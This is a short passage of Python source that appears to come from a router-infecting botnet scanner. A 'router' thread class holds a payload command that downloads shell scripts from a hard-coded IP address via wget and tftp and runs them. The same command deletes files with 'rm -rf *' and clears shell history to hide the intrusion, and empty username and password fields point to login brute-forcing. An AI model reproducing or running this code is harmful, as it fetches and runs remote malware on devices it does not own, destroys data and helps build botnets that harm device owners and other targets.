...
class router(threading.Thread):
    def __init__ (self, ip):
        ...
        self.rekdevice="cd /tmp || cd /run || cd /; wget http://20.213.158.30/obas!.sh; chmod 777 obas!.sh; sh obas!.sh Cipher; tftp 20.213.158.30 -c get obas!tftp1.sh; chmod 777 obas!tftp1.sh; sh obas!tftp1.sh Cipher; tftp -r obas!tftp2.sh -g 20.213.158.30; chmod 777 obas!tftp2.sh; sh obas!tftp2.sh Cipher; rm -rf obas!.sh obas!tftp1.sh obas!tftp2.sh; rm -rf *;history -c" #<---Payload Goes In Between The ---> "" 
    def run(self):
        global fh
        username = ""
        password = ""
